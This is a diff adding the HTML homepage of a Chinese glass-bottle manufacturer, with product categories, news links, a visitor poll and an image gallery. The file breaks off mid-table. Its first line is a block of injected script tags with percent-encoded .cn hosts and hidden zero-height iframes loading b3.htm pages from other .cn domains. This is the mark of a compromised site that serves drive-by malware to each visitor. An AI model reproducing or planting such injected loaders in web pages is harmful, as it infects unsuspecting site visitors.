@@ -1,0 +1,1068 @@
+<script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%34%2E%63%6E></script><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%63%63%68%31%2E%63%6E></script><iframe src=http://www.zgynkmf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%63%63%68%31%2E%63%6E></script><script src=http://%63%63%68%32%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%76%76%6B%32%2E%63%6E></script><iframe src=http://www.falalioo.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script><script src=http://%68%68%6A%32%2E%63%6E></script><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%34%2E%63%6E></script><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%63%63%68%31%2E%63%6E></script><iframe src=http://www.zgynkmf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%63%63%68%31%2E%63%6E></script><script src=http://%63%63%68%32%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%76%76%6B%32%2E%63%6E></script><iframe src=http://www.falalioo.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script><script src=http://%68%68%6A%32%2E%63%6E></script><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script>
+<style type="text/css">
+A{TEXT-DECORATION: none;}
+A:link {color: #000000;}
+A:visited {color: #000000}
+A:active {color: #000000}
+A:hover{COLOR: #FF6600;position: relative; right: 0px; top: 1px}
+
+BODY
+{
+FONT-SIZE: 9pt
+}
+TD
+{
+FONT-FAMILY: 宋体; FONT-SIZE: 9pt;
+color: #000000;
+line-height: 150%; 
+
+}
+Input
+{
+BACKGROUND-COLOR: #FFFDFB; 
+BORDER-BOTTOM: #89a5e6 1px solid;
+BORDER-LEFT: #89a5e6 1px solid;
+BORDER-RIGHT: #89a5e6 1px solid;
+BORDER-TOP: #89a5e6 1px solid;
+COLOR: #205064;
+border-color: #B2C2D7 #B2C2D7 #B2C2D7 #B2C2D7; font-size: 9pt
+}
+Button
+{
+FONT-SIZE: 9pt;HEIGHT: 20px; 
+
+}
+Select
+{
+FONT-SIZE: 9pt;HEIGHT: 20px;
+
+}
+.border
+{
+border: 1px solid #3153C3;
+}
+.border2
+{
+background:#DFE6EE;
+BORDER-bottom: #B2C2D7 1px solid;
+}
+.FootBg
+{
+background:#D8DBE3;
+}
+.title
+{
+background:url(Skin/5/head_bg.GIF);height: 30;
+
+}
+.tdbg
+{
+background:#D8DBE3;
+}
+.txt_css
+{
+
+}
+.title_lefttxt
+{
+
+}
+.title_left
+{
+background:url(Skin/5/left_bg.gif);height: 34;
+}
+.tdbg_left
+{
+background:#C0CDE4;
+border: 1px solid #3153C3;
+}
+.title_left2
+{
+
+}
+.tdbg_left2
+{
+
+}
+.tdbg_leftall
+{
+background:#B5BFDE;
+BORDER-right: #B2C2D7 1px solid;
+
+}
+.title_righttxt
+{
+
+}
+.title_right
+{
+background:url(Skin/5/Right_bg.gif);height: 32;
+}
+.tdbg_right
+{
+
+}
+.title_right2
+{
+
+}
+.tdbg_right2
+{
+
+}
+.tdbg_rightall
+{
+
+}
+</style>
+
+
+<head>
+<style>
+<!--
+.border
+{
+border: 1px solid #FB9F47;
+}
+-->
+</style>
+</head>
+
+<SCRIPT language=javascript 
+src="Menu/Menu_func.js"></SCRIPT>
+<SCRIPT language=javascript 
+src="Menu/Menu_init.js"></SCRIPT>
+
+<head>
+<TITLE>徐州恒发玻璃制品有限公司，玻璃瓶，玻璃瓶厂</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312"> 
+<meta name="keywords" content="徐州前进玻璃瓶厂">
+<LINK href="mt_style.css" type=text/css rel=stylesheet>
+</head>
+
+<BODY leftMargin=0 topMargin=0 marginwidth="0" marginheight="0" onload=init(); background="images/bj.jpg">
+<table width="760" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr> 
+    <td height="166"> 
+	<table width="760" height="193" border="0" cellpadding="0" cellspacing="0" background="top.jpg">
+        <tr> 
+          <td width="262" height="193">
+<div align="center">　</div></td>
+          <td width="167">　</td>
+          <td width="331" valign="top"> 
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="24%" height="40">
+				<p align="center"></a></td>
+                <td width="24%" height="40"><div align="center"><img src="Images/email_2.gif" width="40" height="40"></div></td>
+                <td width="21%"><div align="center"><img src="Images/connact.gif" width="40" height="40"></div></td>
+                <td width="31%"><div align="center"><img src="Images/collection.gif" width="40" height="40"></div></td>
+              </tr>
+              <tr> 
+                <td height="15"> 
+				<p align="center">
+				</td>
+                <td height="15"> <div align="center"><a href="http://www.126.com" >企业邮局</a></div></td>
+                <td><div align="center"><A id="based" style="color:red"><font color="#000000">繁體中文</font></A> 
+                    <Script Language=Javascript Src="Inc/southidcj2f.Js"></Script></div></td>
+                <td><div align="center"><b><a href="Enindex.asp">
+					<font color="#FF0000">English</font></a></b></div></td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+      </table><tr>
+    <td>        
+        <TABLE class="title"  width=760 height="28" border=0 align=center cellPadding=0 cellSpacing=0>
+          <TR> 
+            <TD  colspan="2"> 
+              <div align="right"></div>
+              
+            <div align="right"><a href="index.asp">首 页</a> || <a href="Aboutus.asp?Title=企业简介" id=menu1>企业简介</a>    
+              || <a A href="Conews.asp">新闻资讯</a> || <a  href="Product.asp" id=menu3>产品展示</a>    
+              	|| <a  href="CompHonor.asp" id=menu4>企业荣誉</a>    
+              || <a id=menu5 href="HomeMarket.asp">营销网络</a> || <a  href="HrDemand.asp" id=menu6>人才招聘</a>    
+              || <a href="FeedbackView.asp" id=menu7 >客户留言</a> || <a href="Aboutus.asp?Title=联系我们" id="menu9">联系我们</a>|| <a href="UserServer.asp" id=menu8 >会员中心</a   
+>&nbsp;&nbsp;</div></TD>
+            <TD width="1" ></TD>
+          </TR>  
+      </TABLE>
+<SCRIPT language=javascript src="Menu/Menu_content.js"></SCRIPT>
+    </td>
+  </tr>
+</table>
+<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td bgcolor="#FFFFFF"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="760" height="121">
+        <param name="movie" value="Images/top.swf">
+        <param name="quality" value="high">
+        <param name="wmode" value="transparent">
+        <embed src="Images/top.swf" width="760" height="121" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed></object></td>
+  </tr>
+</table>
+
+<script language=Javascript>
+<!--
+
+if (window.Event) 
+  document.captureEvents(Event.MOUSEUP); 
+
+function nocontextmenu() 
+{
+event.cancelBubble = true
+event.returnvalue = false;
+
+return false;
+}
+
+function norightclick(e) 
+{
+if (window.Event) 
+{
+  if (e.which == 2 || e.which == 3)
+   return false;
+}
+else
+  if (event.button == 2 || event.button == 3)
+  {
+   event.cancelBubble = true
+   event.returnvalue = false;
+   return false;
+  }
+
+}
+
+document.oncontextmenu = nocontextmenu;  // for IE5+
+document.onmousedown = norightclick;  // for all others
+//-->
+</script>
+<TABLE width="760" border=0 align="center" cellPadding=0 cellSpacing=0 bgcolor="#FFFFFF">
+  <TR>
+    <TD height="5"></TD>
+  </TR>
+  <TR> 
+    <TD height="172" ><table width="746" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td width="190" valign="top" class="tdbg_left"> 
+
+
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="34">
+				<p align="center">
+				<img border="0" src="Images/down_1.jpg" width="184" height="68"></td>
+              </tr>
+              <tr> 
+                <td height="5"></td>
+              </tr>
+              <tr> 
+                <td height="10"><table width="79%" border="0" align="center" cellpadding="0" cellspacing="0">
+                    <tr> 
+                      <td> 
+<SCRIPT language=javascript>
+function opencat(cat,img){
+	if(cat.style.display=="none"){
+	cat.style.display="";
+	img.src="img/class2.gif";
+	}	else {
+	cat.style.display="none"; 
+	img.src="img/class1.gif";
+	}
+}
+</Script>
+<TABLE cellSpacing=0 cellPadding=0 width="99%" border=0>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat101000,&#13;&#10; img101000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img101000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=蜂蜜瓶系列'>蜂蜜瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat101000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat102000,&#13;&#10; img102000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img102000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=饮料瓶系列'>饮料瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat102000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat103000,&#13;&#10; img103000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img103000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=酱菜瓶系列'>酱菜瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat103000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat104000,&#13;&#10; img104000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img104000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=罐头瓶系列'>罐头瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat104000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat105000,&#13;&#10; img105000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img105000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=酒瓶系列'>酒瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat105000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat106000,&#13;&#10; img106000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img106000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=麻油玻璃瓶'>麻油玻璃瓶</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat106000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat107000,&#13;&#10; img107000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img107000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=保健玻璃瓶'>保健玻璃瓶</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat107000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat108000,&#13;&#10; img108000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img108000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=调料瓶系列'>调料瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat108000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat109000,&#13;&#10; img109000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img109000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=香水瓶系列'>香水瓶系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat109000 style='DISPLAY: none' colspan="2">
+没有小类
+		</TD>
+	</TR>
+
+	<TR>
+		<TD language=javascript onmouseup="opencat(cat1010000,&#13;&#10; img1010000);" id=item$pval[catID]) style="CURSOR: hand" width=34 height=24 align=center><IMG id=img1010000 src="img/class1.gif" width=20 height=20></TD>
+		<TD width="662"><a href='Product.asp?BigClassName=蜡烛台系列'>蜡烛台系列</a></TD>
+	</TR>
+	<TR>
+		<TD id=cat1010000 style='DISPLAY: none' colspan="2">
+
+&nbsp;<IMG height=20 src="img/class3.gif" width=26 align=absMiddle border=0><a href="Product.asp?BigClassName=蜡烛台系列&Smallclassname=把子杯系列">把子杯系列</a><BR>
+
+		</TD>
+	</TR>
+
+</TABLE>
+ </td>
+                    </tr>
+                  </table></td>
+              </tr>
+			  <tr> 
+                <td height="5"></td>
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="34">
+				<img border="0" src="Images/down_3.gif" width="184" height="62"></td>
+              </tr>
+              <tr> 
+                <td height="10">&nbsp;</td>
+              </tr>
+              <tr> 
+                <td height="10"><table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
+                    <tr> 
+                      <td > <div align="center">
+                          <form name='VoteForm' method='post' action='vote.asp' target='_blank'><td>您是如何知道我公司的网站的？<br><br><input type='radio' name='VoteOption' value='1'>百度搜索<br><input type='radio' name='VoteOption' value='2'>GOOGLE搜索<br><input type='radio' name='VoteOption' value='3'>客户介绍<br><input type='radio' name='VoteOption' value='4'>公司资料<br><br><input name='VoteType' type='hidden'value='Single'><input name='Action' type='hidden' value='Vote'><input name='ID' type='hidden' value='6'><a href='javascript:VoteForm.submit();'><img src='images/voteSubmit.gif' width='52' height='18' border='0'></a>&nbsp;&nbsp;<a href='Vote.asp?Action=Show' target='_blank'><img src='images/voteView.gif' width='52' height='18' border='0'></a></td></form>
+                        </div></td>
+                    </tr>
+                  </table></td>
+              </tr>			  
+            </table>
+          </td>
+          <td width="6" bgcolor="#FFFFFF">　</td>
+          <td Class=border valign="top"> 
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="100%" height="32">
+				<img border="0" src="Images/down_2.gif" width="548" height="53"></td>   
+               
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td height="100" colspan="2"> 
+                        
+                        <table width="100%" border="0" cellspacing="1" cellpadding="0">
+                          <tr> 
+                            <td width="7%" height="8"></td>
+                            <td width="93%"></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=60" target="_blank"> 
+                                  祝贺公司中、英、繁三语网站开通运行！</a><br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=59" target="_blank"> 
+                                  瑞士玻璃包装回收率高达95%</a><br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=58" target="_blank"> 
+                                  什么是安全玻璃</a><br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=57" target="_blank"> 
+                                  我国玻璃瓶包装市场现状</a><br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr> 
+                            <td height="8"></td>
+                            <td></td>
+                          </tr>
+                        </table></td>
+                      <td width="51%" colspan="2"> 
+                        
+                        <table width="100%" border="0" cellspacing="1" cellpadding="0">
+                          <tr> 
+                            <td width="6%" height="8"></td>
+                            <td width="94%"></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=56" target="_blank"> 
+                                  供应食品玻璃瓶,果汁瓶，果茶瓶，饮料瓶，...</a> <br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=55" target="_blank"> 
+                                  装食用油最好用玻璃瓶</a> <br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=54" target="_blank"> 
+                                  玻璃瓶的技术变革</a> <br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr align="center"> 
+                            <td>
+							<img src="Img/arrow_6.gif" width="11" height="11"> 
+                            </td>
+                            <td style='BORDER-bottom: #999999 1px dotted'> <div align="left"> 
+                                <p style='line-height:150%'><a href="shownews.asp?id=53" target="_blank"> 
+                                  徐州恒发玻璃制品有限公司</a> <br>
+                              </div></td>
+                          </tr>
+                          
+                          <tr> 
+                            <td height="8"></td>
+                            <td></td>
+                          </tr>
+                        </table></td>
+                    </tr>
+                    <tr> 
+                      <td colspan="2"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                          <tr> 
+                            <td height="15"> <div align="right">
+								<img src="Images/more_1.gif" width="85" height="27" border="0" usemap="#Map2Map"> 
+                                <map name="Map2Map">
+                                  <area shape="rect" coords="20,15,70,25" href="NewsClass.asp?BigClass=企业新闻">
+                                </map>
+                              </div></td>
+                          </tr>
+                        </table></td>
+                      <td colspan="2"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                          <tr> 
+                            <td><div align="right">
+								<img src="Images/more_1.gif" width="85" height="27" border="0" usemap="#Map2"></div></td>
+                          </tr>
+                        </table></td>
+                    </tr>
+                  </table>
+                  <map name="Map2">
+                    <area shape="rect" coords="22,15,72,25" href="NewsClass.asp?BigClass=业内资讯">
+                  </map></td>
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="32">
+				<img border="0" src="Images/down_12.gif" width="546" height="66"></td>  
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td><META http-equiv=Content-Type content="text/html; charset=gb2312"> 
+<!--最新图文代码开始-->
+<script language="JavaScript"> 
+<!-- 
+var flag=false; 
+function DrawImage(ImgD){ 
+ var image=new Image(); 
+ image.src=ImgD.src; 
+ if(image.width>0 && image.height>0){ 
+  flag=true; 
+  if(image.width/image.height>= 105/80){ 
+   if(image.width>105){
+    ImgD.width=105; 
+    ImgD.height=(image.height*105)/image.width; 
+   }else{ 
+    ImgD.width=image.width;
+    ImgD.height=image.height; 
+   } 
+   ImgD.alt="点击查看详细信息..."; 
+  } 
+  else{ 
+   if(image.height>80){
+    ImgD.height=80; 
+    ImgD.width=(image.width*80)/image.height; 
+   }else{ 
+    ImgD.width=image.width;
+    ImgD.height=image.height; 
+   } 
+   ImgD.alt="点击查看详细信息..."; 
+  } 
+ }
+}
+//--> 
+</script> 
+
+<div align='center' id='demo' style='overflow:hidden;height:125px;width:545px;'><!--滚动区的高度和宽度-->
+<table align='center' cellpadding='0' cellspace='0' border='0'>
+<tr>
+	<td id='demo1' valign='top'>
+		<table width='100%' cellpadding='0' cellspacing='0' border='0' align='center'>
+		<tr valign='top'>
+	
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=505' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/20089311121920.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=505' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=504' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/20089311054438.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=504' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=503' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/20089311032745.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
